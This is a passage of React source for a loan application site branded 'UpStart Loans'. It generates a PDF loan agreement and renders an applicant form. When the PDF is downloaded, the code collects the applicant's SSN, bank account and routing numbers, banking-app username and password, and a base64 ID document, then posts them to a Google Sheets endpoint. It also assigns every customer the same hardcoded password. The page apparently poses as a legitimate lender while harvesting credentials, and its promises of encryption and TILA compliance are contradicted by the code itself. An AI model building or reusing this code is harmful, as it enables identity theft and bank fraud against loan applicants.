3. Consequences of Default
Upon default, Lender may declare the entire outstanding balance immediately due and payable, report the default to credit bureaus, and pursue collection activities as permitted by law.

4. Collection Costs
Borrower agrees to pay all costs of collection, including reasonable attorney fees, incurred by Lender in enforcing this agreement.

PRIVACY & SECURITY
1. Data Protection
All personal and financial information is protected using industry-standard SSL encryption and data protection protocols. We comply with all applicable data protection laws.

2. Information Sharing
We may share your information with: (a) Credit bureaus for reporting purposes; (b) Government agencies as required by law; (c) Service providers who assist in loan processing.

3. Security Measures
Our website uses 256-bit SSL encryption, firewalls, and regular protection audits to protect your data. All sensitive information is encrypted both in transit and at rest.

US LEGAL CLAUSES & COMPLIANCE
1. Truth in Lending Act (TILA) Compliance
This agreement complies with the Truth in Lending Act. All APR, fees, and terms have been clearly disclosed. Borrower has the right to rescind this agreement within 3 business days.

2. Electronic Agreement Act Compliance
This electronic agreement has the same legal effect as a paper document. By signing electronically, Borrower consents to conduct business electronically.

3. Governing Law
This agreement shall be governed by and construed in accordance with the laws of the State of New York, without regard to its conflict of law principles.

4. Dispute Resolution
Any disputes arising from this agreement shall be resolved through binding arbitration in accordance with the rules of the American Arbitration Association.

5. Entire Agreement
This agreement constitutes the entire understanding between the parties and supersedes all prior agreements, whether written or oral.

PAYMENT SCHEDULE
Monthly Payment Schedule
Borrower shall make ${months} equal monthly payments of $${monthlyPayment.toFixed(2)} each.
First payment is due within 30 days of loan disbursement.
Each subsequent payment is due on the same day of each month thereafter.

Payment Breakdown
Payment Amount: $${monthlyPayment.toFixed(2)} per month
Number of Payments: ${months}
Total Amount to be Paid: $${totalRepayment.toFixed(2)}
Total Interest Paid: $${(totalRepayment - principal).toFixed(2)}

Payment Methods
Payments can be made via: (a) Automatic bank transfer (ACH); (b) Online payment portal; (c) Check by mail; (d) Phone payment.
Automatic bank transfer is the preferred method to ensure timely payments.

PAYMENT AMORTIZATION SCHEDULE
${(() => {
  let schedule = 'Payment #\tPayment Date\tPayment Amount\tPrincipal\tInterest\tBalance\n'
  let balance = principal
  const startDate = new Date()
  
  for (let i = 1; i <= months; i++) {
    const paymentDate = new Date(startDate.getFullYear(), startDate.getMonth() + i, 6)
    const interestPayment = balance * monthlyRate
    const principalPayment = monthlyPayment - interestPayment
    balance -= principalPayment
    
    schedule += `${i}\t${paymentDate.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}\t$${monthlyPayment.toFixed(2)}\t$${principalPayment.toFixed(2)}\t$${interestPayment.toFixed(2)}\t$${Math.max(0, balance).toFixed(2)}\n`
  }
  
  return schedule
})()}

ELECTRONIC CONSENT & AGREEMENT
By clicking "I Agree" below, I certify that:
1. I have read, understood, and agree to all terms and conditions in this loan agreement
2. All information provided is true and accurate to the best of my knowledge
3. I understand this is a legally binding agreement
4. I consent to receive loan documents and communications electronically
5. I understand that my electronic agreement has the same legal effect as a handwritten signature

Borrower Signature: ${signature.includes('data:') ? 'Electronic Signature (Canvas)' : signature}
Date: ${new Date().toLocaleDateString()}

For questions, contact: support@upstarsloans.com | 1-800-UPSTARS
Privacy Policy: www.upstarsloans.com/privacy-policy
Terms of Service: www.upstarsloans.com/terms-of-service`
  }

  const downloadCompleteAgreement = async (event) => {
    if (!agreementAccepted) {
      alert('Please accept the agreement before downloading.')
      return
    }
    
    try {
      // Show loading state
      const button = event.target
      const originalText = button.textContent
      button.textContent = 'Generating PDF...'
      button.disabled = true
      
      // Create PDF
      const pdf = new jsPDF('p', 'mm', 'a4')
      
      // Add custom font for better readability
      pdf.setFontSize(12)
      
      // Function to check if we need a new page
      const checkAndAddPage = (yPosition, additionalHeight = 20) => {
        if (yPosition + additionalHeight > 270) { // Leave space for footer
          pdf.addPage()
          return 20 // Reset yPosition for new page
        }
        return yPosition
      }
      
      // Add header
      pdf.setFontSize(20)
      pdf.setTextColor(0, 51, 102)
      pdf.text(`${currentLoanConfig.title} AGREEMENT`, 105, 20, { align: 'center' })
      
      pdf.setFontSize(14)
      pdf.setTextColor(0, 0, 0)
      pdf.text('UpStart Loans', 105, 30, { align: 'center' })
      
      // Add agreement details
      pdf.setFontSize(10)
      const agreementDetails = [
        `Agreement Number: LS-${Date.now().toString()}`,
        `Date: ${new Date().toLocaleDateString()}`
      ]
      
      let yPosition = 50
      agreementDetails.forEach(detail => {
        pdf.text(detail, 20, yPosition)
        yPosition += 8
      })
      
      // Add application review
      yPosition += 10
      yPosition = checkAndAddPage(yPosition, 30)
      pdf.setFontSize(12)
      pdf.setTextColor(0, 51, 102)
      pdf.text('APPLICATION REVIEW', 20, yPosition)
      yPosition += 8
      pdf.setFontSize(10)
      pdf.setTextColor(0, 0, 0)
      pdf.text('Our system reviews your application and matches you with suitable lenders.', 20, yPosition)
      yPosition += 8
      
      // Add loan summary & disclosure
      yPosition += 10
      yPosition = checkAndAddPage(yPosition, 60)
      pdf.setFontSize(12)
      pdf.setTextColor(0, 51, 102)
      pdf.text('LOAN SUMMARY & DISCLOSURE', 20, yPosition)
      yPosition += 8
      
      pdf.setFontSize(10)
      pdf.setTextColor(0, 0, 0)
      const principal = parseFloat(formData.loanAmount) || 0
      const months = parseInt(formData.loanTerm) || 12
      const monthlyRate = 0.10 / 12
      const monthlyPayment = principal * (monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1)
      const totalRepayment = monthlyPayment * months
      
      const loanSummary = [
        `Borrower Name: ${formData.firstName} ${formData.lastName}`,
        `Loan Amount: $${principal.toLocaleString()}.00`,
        `Loan Duration: ${months} months`,
        `Annual Percentage Rate (APR): 10.00%`,
        `Monthly Payment (EMI): $${monthlyPayment.toFixed(2)}`,
        `Total Repayment Amount: $${totalRepayment.toFixed(2)}`
      ]
      
      loanSummary.forEach(info => {
        yPosition = checkAndAddPage(yPosition, 8)
        pdf.text(info, 20, yPosition)
        yPosition += 8
      })
      
      // Add borrower details
      yPosition += 10
      yPosition = checkAndAddPage(yPosition, 70)
      pdf.setFontSize(12)
      pdf.setTextColor(0, 51, 102)
      pdf.text('BORROWER DETAILS', 20, yPosition)
      yPosition += 8
      
      pdf.setFontSize(10)
      pdf.setTextColor(0, 0, 0)
      const borrowerInfo = [
        `Full Name: ${formData.firstName} ${formData.lastName}`,
        `Email Address: ${formData.email}`,
        `Phone Number: •••••••${formData.phoneNumber ? formData.phoneNumber.slice(-4) : ''}`,
        `Financial Institution: ${formData.bankName}`,
        `Account Routing Number: ${formData.routingNumber}`,
        `Account Number: •••••••${formData.accountNumber ? formData.accountNumber.slice(-4) : ''}`,
        `Address: ${formData.homeAddress}, ${formData.city}, ${formData.state} ${formData.zipCode}`
      ]
      
      borrowerInfo.forEach(info => {
        yPosition = checkAndAddPage(yPosition, 8)
        pdf.text(info, 20, yPosition)
        yPosition += 8
      })
      
      // Add loan terms & conditions
      yPosition += 10
      yPosition = checkAndAddPage(yPosition, 80)
      pdf.setFontSize(12)
      pdf.setTextColor(0, 51, 102)
      pdf.text('LOAN TERMS & CONDITIONS', 20, yPosition)
      yPosition += 8
      
      pdf.setFontSize(10)
      pdf.setTextColor(0, 0, 0)
      const loanTerms = [
        '1. Loan Amount and Purpose',
        `Lender agrees to lend to Borrower principal sum of $${principal.toLocaleString()}.00 ("Loan Amount") for personal, family, or household purposes. This loan is unsecured and not backed by any collateral.`,
        '2. Interest Rate',
        'The Loan Amount shall bear interest at a fixed annual percentage rate (APR) of 10.00%. Interest will be calculated on outstanding principal balance.',
        '3. Loan Term',
        `The loan term shall be ${months} months, commencing from the date of this agreement.`,
        '4. Payment Schedule',
        `Borrower shall make equal monthly payments of $${monthlyPayment.toFixed(2)} on 6 day of each month. The first payment is due within 30 days of loan disbursement.`,
        '5. Prepayment',
        'Borrower may prepay all or any portion of Loan Amount at any time without penalty. Prepayment will be applied first to accrued interest, then to principal.'
      ]
      
      loanTerms.forEach(term => {
        yPosition = checkAndAddPage(yPosition, 12)
        pdf.text(term, 20, yPosition)
        yPosition += 12
      })
      
      // Add repayment, late fees & default
      yPosition += 10
      yPosition = checkAndAddPage(yPosition, 60)
      pdf.setFontSize(12)
      pdf.setTextColor(0, 51, 102)
      pdf.text('REPAYMENT, LATE FEES & DEFAULT', 20, yPosition)
      yPosition += 8
      
      pdf.setFontSize(10)
      pdf.setTextColor(0, 0, 0)
      const repaymentTerms = [
        '1. Late Payment Fees',
        'If any payment is not received within 10 days of due date, a late fee of $25 or 5% of overdue amount, whichever is greater, will be charged.',
        '2. Default',
        'The loan will be considered in default if: (a) Borrower fails to make any payment when due; (b) Borrower provides false information; (c) Borrower becomes bankrupt or insolvent.',
        '3. Consequences of Default',
        'Upon default, Lender may declare the entire outstanding balance immediately due and payable, report the default to credit bureaus, and pursue collection activities as permitted by law.',
        '4. Collection Costs',
        'Borrower agrees to pay all costs of collection, including reasonable attorney fees, incurred by Lender in enforcing this agreement.'
      ]
      
      repaymentTerms.forEach(term => {
        yPosition = checkAndAddPage(yPosition, 12)
        pdf.text(term, 20, yPosition)
        yPosition += 12
      })
      
      // Add privacy & security
      yPosition += 10
      yPosition = checkAndAddPage(yPosition, 50)
      pdf.setFontSize(12)
      pdf.setTextColor(0, 51, 102)
      pdf.text('PRIVACY & SECURITY', 20, yPosition)
      yPosition += 8
      
      pdf.setFontSize(10)
      pdf.setTextColor(0, 0, 0)
      const privacyTerms = [
        '1. Data Protection',
        'All personal and financial information is protected using industry-standard SSL encryption and data protection protocols. We comply with all applicable data protection laws.',
        '2. Information Sharing',
        'We may share your information with: (a) Credit bureaus for reporting purposes; (b) Government agencies as required by law; (c) Service providers who assist in loan processing.',
        '3. Security Measures',
        'Our website uses 256-bit SSL encryption, firewalls, and regular protection audits to protect your data. All sensitive information is encrypted both in transit and at rest.'
      ]
      
      privacyTerms.forEach(term => {
        yPosition = checkAndAddPage(yPosition, 12)
        pdf.text(term, 20, yPosition)
        yPosition += 12
      })
      
      // Add US legal clauses & compliance
      yPosition += 10
      yPosition = checkAndAddPage(yPosition, 70)
      pdf.setFontSize(12)
      pdf.setTextColor(0, 51, 102)
      pdf.text('US LEGAL CLAUSES & COMPLIANCE', 20, yPosition)
      yPosition += 8
      
      pdf.setFontSize(10)
      pdf.setTextColor(0, 0, 0)
      const legalClauses = [
        '1. Truth in Lending Act (TILA) Compliance',
        'This agreement complies with the Truth in Lending Act. All APR, fees, and terms have been clearly disclosed. Borrower has the right to rescind this agreement within 3 business days.',
        '2. Electronic Agreement Act Compliance',
        'This electronic agreement has the same legal effect as a paper document. By signing electronically, Borrower consents to conduct business electronically.',
        '3. Governing Law',
        'This agreement shall be governed by and construed in accordance with the laws of the State of New York, without regard to its conflict of law principles.',
        '4. Dispute Resolution',
        'Any disputes arising from this agreement shall be resolved through binding arbitration in accordance with the rules of the American Arbitration Association.',
        '5. Entire Agreement',
        'This agreement constitutes the entire understanding between the parties and supersedes all prior agreements, whether written or oral.'
      ]
      
      legalClauses.forEach(clause => {
        yPosition = checkAndAddPage(yPosition, 12)
        pdf.text(clause, 20, yPosition)
        yPosition += 12
      })
      
      // Add payment schedule
      yPosition += 10
      yPosition = checkAndAddPage(yPosition, 40)
      pdf.setFontSize(12)
      pdf.setTextColor(0, 51, 102)
      pdf.text('PAYMENT SCHEDULE', 20, yPosition)
      yPosition += 8
      
      pdf.setFontSize(10)
      pdf.setTextColor(0, 0, 0)
      const paymentSchedule = [
        'Monthly Payment Schedule',
        `Borrower shall make ${months} equal monthly payments of $${monthlyPayment.toFixed(2)} each.`,
        'First payment is due within 30 days of loan disbursement.',
        'Each subsequent payment is due on the same day of each month thereafter.'
      ]
      
      paymentSchedule.forEach(item => {
        yPosition = checkAndAddPage(yPosition, 8)
        pdf.text(item, 20, yPosition)
        yPosition += 8
      })
      
      // Add payment breakdown
      yPosition += 5
      yPosition = checkAndAddPage(yPosition, 40)
      pdf.setFontSize(10)
      pdf.setTextColor(0, 0, 0)
      const paymentBreakdown = [
        `Payment Amount: $${monthlyPayment.toFixed(2)} per month`,
        `Number of Payments: ${months}`,
        `Total Amount to be Paid: $${totalRepayment.toFixed(2)}`,
        `Total Interest Paid: $${(totalRepayment - principal).toFixed(2)}`
      ]
      
      paymentBreakdown.forEach(item => {
        yPosition = checkAndAddPage(yPosition, 8)
        pdf.text(item, 20, yPosition)
        yPosition += 8
      })
      
      // Add payment methods
      yPosition += 5
      yPosition = checkAndAddPage(yPosition, 25)
      pdf.setFontSize(10)
      pdf.setTextColor(0, 0, 0)
      const paymentMethods = [
        'Payments can be made via: (a) Automatic bank transfer (ACH); (b) Online payment portal; (c) Check by mail; (d) Phone payment.',
        'Automatic bank transfer is the preferred method to ensure timely payments.'
      ]
      
      paymentMethods.forEach(method => {
        yPosition = checkAndAddPage(yPosition, 8)
        pdf.text(method, 20, yPosition)
        yPosition += 8
      })
      
      // Add payment amortization schedule
      yPosition += 10
      yPosition = checkAndAddPage(yPosition, 80)
      pdf.setFontSize(12)
      pdf.setTextColor(0, 51, 102)
      pdf.text('PAYMENT AMORTIZATION SCHEDULE', 20, yPosition)
      yPosition += 8
      
      pdf.setFontSize(10)
      pdf.setTextColor(0, 0, 0)
      pdf.text('Payment #\tPayment Date\tPayment Amount\tPrincipal\tInterest\tBalance', 20, yPosition)
      yPosition += 8
      
      let balance = principal
      const startDate = new Date()
      
      for (let i = 1; i <= months; i++) {
        yPosition = checkAndAddPage(yPosition, 6)
        const paymentDate = new Date(startDate.getFullYear(), startDate.getMonth() + i, 6)
        const interestPayment = balance * monthlyRate
        const principalPayment = monthlyPayment - interestPayment
        balance -= principalPayment
        
        const amortizationRow = `${i}\t${paymentDate.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}\t$${monthlyPayment.toFixed(2)}\t$${principalPayment.toFixed(2)}\t$${interestPayment.toFixed(2)}\t$${Math.max(0, balance).toFixed(2)}`
        pdf.text(amortizationRow, 20, yPosition)
        yPosition += 6
      }
      
      // Add electronic consent & agreement
      yPosition += 10
      yPosition = checkAndAddPage(yPosition, 60)
      pdf.setFontSize(12)
      pdf.setTextColor(0, 51, 102)
      pdf.text('ELECTRONIC CONSENT & AGREEMENT', 20, yPosition)
      yPosition += 8
      
      pdf.setFontSize(10)
      pdf.setTextColor(0, 0, 0)
      const consentText = [
        'By clicking "I Agree" below, I certify that:',
        '1. I have read, understood, and agree to all terms and conditions in this loan agreement',
        '2. All information provided is true and accurate to the best of my knowledge',
        '3. I understand this is a legally binding agreement',
        '4. I consent to receive loan documents and communications electronically',
        '5. I understand that my electronic agreement has the same legal effect as a handwritten signature'
      ]
      
      consentText.forEach(text => {
        yPosition = checkAndAddPage(yPosition, 8)
        pdf.text(text, 20, yPosition)
        yPosition += 8
      })
      
      // Add signature section
      yPosition += 10
      yPosition = checkAndAddPage(yPosition, 40)
      pdf.setFontSize(12)
      pdf.setTextColor(0, 51, 102)
      pdf.text('BORROWER SIGNATURE', 20, yPosition)
      yPosition += 15
      
      if (signature && signature.startsWith('data:image')) {
        // Add signature image
        try {
          const imgWidth = 50
          const imgHeight = 25
          pdf.addImage(signature, 'PNG', 20, yPosition, imgWidth, imgHeight)
          yPosition += imgHeight + 10
          
          pdf.setFontSize(10)
          pdf.setTextColor(0, 0, 0)
          pdf.text(`Signed on: ${new Date().toLocaleDateString()}`, 20, yPosition)
        } catch (error) {
          console.error('Error adding signature to PDF:', error)
          pdf.text('Electronic Signature (Canvas)', 20, yPosition)
        }
      } else {
        // Add note for unsigned agreement
        pdf.setFontSize(10)
        pdf.setTextColor(0, 0, 0)
        pdf.text('Signature: Not provided (Agreement accepted without signature)', 20, yPosition)
      }
      
      // Add footer to all pages
      const pageCount = pdf.internal.getNumberOfPages()
      for (let i = 1; i <= pageCount; i++) {
        pdf.setPage(i)
        pdf.setFontSize(8)
        pdf.setTextColor(100, 100, 100)
        pdf.text('For questions, contact: support@upstarsloans.com | 1-800-UPSTARS', 105, 280, { align: 'center' })
        pdf.text('Privacy Policy: www.upstarsloans.com/privacy-policy | Terms of Service: www.upstarsloans.com/terms-of-service', 105, 285, { align: 'center' })
        pdf.text(`Page ${i} of ${pageCount}`, 105, 290, { align: 'center' })
      }
      
      // Save the PDF
      const fileName = `${currentLoanConfig.title.toLowerCase().replace(' ', '-')}-agreement-${formData.firstName}-${formData.lastName}-${Date.now()}.pdf`
      pdf.save(fileName)
      
      // Reset button
      button.textContent = originalText
      button.disabled = false
      
      let pdfIdProofBase64 = ''
      if (idProof) {
        const dataUrl = await convertFileToBase64(idProof)
        pdfIdProofBase64 = stripBase64Prefix(dataUrl)
      }

      // Store customer data for dashboard access
      const customerData = {
        applicationId: 'LS-' + Date.now(),
        firstName: formData.firstName,
        lastName: formData.lastName,
        email: formData.email,
        phoneNumber: formData.phoneNumber,
        homeAddress: formData.homeAddress,
        city: formData.city,
        state: formData.state,
        zipCode: formData.zipCode,
        dateOfBirth: formData.dateOfBirth,
        ssnNumber: formData.ssnNumber,
        loanAmount: formData.loanAmount,
        loanPurpose: formData.loanPurpose,
        loanTerm: formData.loanTerm,
        monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm),
        loanAgent: formData.loanAgent,
        bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
        mobileAppUsername: formData.mobileAppUsername,
        mobileAppPassword: formData.mobileAppPassword,
        routingNumber: formData.routingNumber,
        accountNumber: formData.accountNumber,
        userId: formData.firstName.toLowerCase() + '_' + formData.lastName.toLowerCase() + '_' + formData.phoneNumber.slice(-4),
        password: 'UpStarLoan#2024',
        status: 'review',
        submissionDate: new Date().toLocaleDateString(),
        idProofName: idProof ? idProof.name : 'Not uploaded',
        idProofSize: idProof ? `${(idProof.size / 1024 / 1024).toFixed(2)} MB` : '0 MB',
        idProofType: idProof ? idProof.type : 'None',
        idProofBase64: pdfIdProofBase64,
      };

      // Store in sessionStorage for dashboard access
      sessionStorage.setItem('customerData', JSON.stringify(customerData));
      
      // Save customer data to Google Sheets for admin dashboard
      try {
        const googleSheetsData = {
          action: 'saveCustomer',
          ...customerData,
          status: 'review',
          idProofUploaded: true,
          adminNotes: ''
        };
        
        const response = await fetch(CONFIG.googleSheets.customerService, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams(googleSheetsData)
        });
        
        const result = await response.json();
        console.log('Google Sheets response:', result);
      } catch (error) {
        console.error('Error saving to Google Sheets:', error);
      }

      alert('PDF agreement downloaded successfully! Your login details are provided on the next page.')
      
      // Navigate to customer login details page
      navigate('/customer-login-details')
      
    } catch (error) {
      console.error('Error generating PDF:', error)
      alert('Error generating PDF. Please try again.')
      // Reset button
      if (button && originalText) {
        button.textContent = originalText
        button.disabled = false
      }
    }
  }

  const renderStep1 = () => (
    <div className="max-w-4xl mx-auto">
      <div className="text-center mb-8">
        <div className="w-16 h-16 bg-primary-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <span className="text-2xl">{currentLoanConfig.icon}</span>
        </div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Step 1: Your Information</h2>
        <p className="text-gray-600 mb-2">{currentLoanConfig.description}</p>
        <div className="flex justify-center space-x-4 text-sm text-gray-500">
          <span>Available: {currentLoanConfig.amounts}</span>
          <span>•</span>
          <span>Terms: {currentLoanConfig.terms}</span>
        </div>
      </div>

      <form onSubmit={handleStep1Submit} className="space-y-8">
        {/* Loan Agent Selection */}
        <div className="bg-blue-50 rounded-xl p-6 border border-blue-200">
          <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
            <User className="w-5 h-5 mr-2 text-blue-600" />
            Loan Agent Information
          </h3>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Select Your Loan Agent *
              </label>
              <select
                name="loanAgent"
                value={formData.loanAgent}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                required
              >
                <option value="">Select loan agent</option>
                {LOAN_AGENTS.map((agent) => (
                  <option key={agent} value={agent}>
                    {agent}
                  </option>
                ))}
              </select>
              <p className="text-xs text-gray-500 mt-1">
                Please select the loan agent you are working with
              </p>
            </div>
          </div>
        </div>

        {/* Loan Information */}
        <div className="bg-gray-50 rounded-xl p-6">
          <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
            <DollarSign className="w-5 h-5 mr-2 text-primary-600" />
            {currentLoanConfig.title} Information
          </h3>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Loan Amount ($2,000 - $25,000)
              </label>
              <div className="relative">
                <DollarSign className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                <input
                  type="number"
                  name="loanAmount"
                  value={formData.loanAmount}
                  onChange={handleInputChange}
                  className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 ${
                    validationErrors.loanAmount ? 'border-red-500' : 'border-gray-300'
                  }`}
                  placeholder="5000"
                  min="2000"
                  max="25000"
                  required
                />
              </div>
              {validationErrors.loanAmount && (
                <p className="text-red-500 text-sm mt-1">
                  {validationErrors.loanAmount}
                </p>
              )}
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Loan Term (Months)
              </label>
              <select
                name="loanTerm"
                value={formData.loanTerm}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                required
              >
                <option value="">Select loan term</option>
                <option value="6">6 months</option>
                <option value="12">12 months</option>
                <option value="18">18 months</option>
                <option value="24">24 months</option>
                <option value="30">30 months</option>
                <option value="36">36 months</option>
                <option value="42">42 months</option>
                <option value="48">48 months</option>
                <option value="54">54 months</option>
                <option value="60">60 months</option>
              </select>
                          </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Loan Purpose *
              </label>
              <select
                name="loanPurpose"
                value={formData.loanPurpose}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                required
              >
                <option value="">Select loan purpose</option>
                <option value="vacation">Vacation</option>
                <option value="medical emergency">Medical Emergency</option>
                <option value="wedding">Wedding</option>
                <option value="emergency funds">Emergency Funds</option>
                <option value="bill payment">Bill Payment</option>
                <option value="debt consolidation">Debt Consolidation</option>
                <option value="home improvement">Home Improvement</option>
                <option value="car purchase">Car Purchase</option>
                <option value="education">Education</option>
                <option value="business">Business</option>
                <option value="moving">Moving</option>
                <option value="other">Other</option>
              </select>
              <p className="text-xs text-gray-500 mt-1">
                Select the primary purpose for your loan
              </p>
            </div>
          </div>
        
        {/* Monthly Payment Display */}
        {formData.loanAmount && formData.loanTerm && (
          <div className="bg-blue-50 rounded-xl p-6 mt-6">
            <div className="flex items-center justify-between">
              <div>
                <h4 className="text-lg font-semibold text-blue-900">Monthly Payment Calculation</h4>
                <p className="text-sm text-blue-700 mt-1">Based on 10% fixed APR</p>
              </div>
              <div className="text-right">
                <p className="text-2xl font-bold text-blue-900">
                  ${calculateMonthlyPayment(formData.loanAmount, parseInt(formData.loanTerm))}
                </p>
                <p className="text-sm text-blue-700">per month</p>
              </div>
            </div>
          </div>
        )}
        </div>

        {/* Personal Information */}
        <div className="bg-gray-50 rounded-xl p-6">
          <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
            <User className="w-5 h-5 mr-2 text-primary-600" />
            Personal Information
          </h3>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                First Name *
              </label>
              <input
                type="text"
                name="firstName"
                value={formData.firstName}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="John"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Last Name *
              </label>
              <input
                type="text"
                name="lastName"
                value={formData.lastName}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="Doe"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Email Address *
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                  placeholder="john.doe@example.com"
                  required
                />
              </div>
              <p className="text-xs text-gray-500 mt-1">
                We only use your email to connect you with providers
              </p>
            </div>

            <div className="md:col-span-2">
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Home Address *
              </label>
              <div className="relative">
                <MapPin className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                <input
                  type="text"
                  name="homeAddress"
                  value={formData.homeAddress}
                  onChange={handleInputChange}
                  className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                  placeholder="123 Main Street"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                City *
              </label>
              <input
                type="text"
                name="city"
                value={formData.city}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="New York"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                State *
              </label>
              <select
                name="state"
                value={formData.state}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                required
              >
                <option value="">Select a state</option>
                <option value="AL">Alabama</option>
                <option value="AK">Alaska</option>
                <option value="AZ">Arizona</option>
                <option value="AR">Arkansas</option>
                <option value="CA">California</option>
                <option value="CO">Colorado</option>
                <option value="CT">Connecticut</option>
                <option value="DE">Delaware</option>
                <option value="FL">Florida</option>
                <option value="GA">Georgia</option>
                <option value="HI">Hawaii</option>
                <option value="ID">Idaho</option>
                <option value="IL">Illinois</option>
                <option value="IN">Indiana</option>
                <option value="IA">Iowa</option>
                <option value="KS">Kansas</option>
                <option value="KY">Kentucky</option>
                <option value="LA">Louisiana</option>
                <option value="ME">Maine</option>
                <option value="MD">Maryland</option>
                <option value="MA">Massachusetts</option>
                <option value="MI">Michigan</option>
                <option value="MN">Minnesota</option>
                <option value="MS">Mississippi</option>
                <option value="MO">Missouri</option>
                <option value="MT">Montana</option>
                <option value="NE">Nebraska</option>
                <option value="NV">Nevada</option>
                <option value="NH">New Hampshire</option>
                <option value="NJ">New Jersey</option>
                <option value="NM">New Mexico</option>
                <option value="NY">New York</option>
                <option value="NC">North Carolina</option>
                <option value="ND">North Dakota</option>
                <option value="OH">Ohio</option>
                <option value="OK">Oklahoma</option>
                <option value="OR">Oregon</option>
                <option value="PA">Pennsylvania</option>
                <option value="RI">Rhode Island</option>
                <option value="SC">South Carolina</option>
                <option value="SD">South Dakota</option>
                <option value="TN">Tennessee</option>
                <option value="TX">Texas</option>
                <option value="UT">Utah</option>
                <option value="VT">Vermont</option>
                <option value="VA">Virginia</option>
                <option value="WA">Washington</option>
                <option value="WV">West Virginia</option>
                <option value="WI">Wisconsin</option>
                <option value="WY">Wyoming</option>
              </select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                ZIP Code *
              </label>
              <input
                type="text"
                name="zipCode"
                value={formData.zipCode}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="10001"
                pattern="[0-9]{5}"
                maxLength="5"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Date of Birth *
              </label>
              <div className="relative">
                <Calendar className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                <input
                  type="text"
                  name="dateOfBirth"
                  value={formData.dateOfBirth}
                  onChange={handleInputChange}
                  className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                  placeholder="MM/DD/YYYY"
                  pattern="[0-9]{2}/[0-9]{2}/[0-9]{4}"
                  maxLength="10"
                  required
                />
              </div>
              <p className="text-xs text-gray-500 mt-1">Enter your date of birth in MM/DD/YYYY format (e.g., 01/15/1990)</p>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                SSN Number *
              </label>
              <input
                type="text"
                name="ssnNumber"
                value={formData.ssnNumber}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                placeholder="123456789"
                pattern="[0-9]{9}"
                maxLength="9"
                required
              />
            </div>
          </div>
        </div>

        {/* Financial Information */}
        <div className="bg-gray-50 rounded-xl p-6">
          <h3 className="text-lg font-semibold text-gray-900 mb-2 flex items-center">
            <CreditCard className="w-5 h-5 mr-2 text-primary-600" />
            Financial Information
          </h3>
          <p className="text-sm text-gray-600 mb-4">Your information is encrypted and secure</p>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Bank Name *
              </label>
              <div className="relative">
                <Building2 className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
                <select
                  name="bankName"
                  value={formData.bankName}
                  onChange={handleInputChange}
